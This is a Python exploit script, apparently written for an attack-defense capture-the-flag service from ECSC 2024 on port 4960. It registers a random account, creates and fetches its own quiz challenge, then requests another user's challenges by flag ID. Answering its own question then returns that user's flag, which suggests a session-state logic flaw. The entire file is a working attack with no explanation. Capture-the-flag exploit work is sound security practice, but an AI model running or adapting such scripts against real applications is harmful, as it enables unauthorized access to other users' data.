import sys
import requests
import string
import random

PORT = 4960

def register(ip, session, username, password):
    session.post(f'http://{ip}:{PORT}/api/register', json={"name": username, "password": password})

def create_random_challenge(ip, session):
    r = session.post(f'http://{ip}:{PORT}/api/upload', json={"url": "https://ecsc2024.it/_next/static/media/ecsc2024.f58d72ba.svg", "filename": "ecsc"})
    r = session.post(f'http://{ip}:{PORT}/api/createchallenge',
                     json={"text": "A", "image": "ecsc", "answers": {
                         1: {"answer": "1", "correct": True},
                         2: {"answer": "2", "correct": True},
                         3: {"answer": "3", "correct": True},
                         }, "prize": "-"})

def get_challenges(ip, session, user):
    r = session.get(f'http://{ip}:{PORT}/api/challenges/{user}')
    return r.json()["challenges"]

def get_challenge(ip, session, id):
    r = session.get(f'http://{ip}:{PORT}/api/question/{id}')
    return r.json()
    
def answer_challenge(ip, session, answer):
    r = session.post(f'http://{ip}:{PORT}/api/answer', json={"answer": answer})
    return r.json()

def exploit(ip, flag_id):
    session = requests.Session()
    username = ''.join([random.choice(string.ascii_letters) for _ in range(20)])
    password = ''.join([random.choice(string.ascii_letters) for _ in range(20)])

    register(ip, session, username, password)
    create_random_challenge(ip, session)
    my_chall = get_challenges(ip, session, username)[0]
    get_challenge(ip, session, my_chall['_id'])
    get_challenges(ip, session, flag_id)
    flag = answer_challenge(ip, session, my_chall["correct"][0])["message"]
    
    return flag

if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(exploit(ip, flag_id))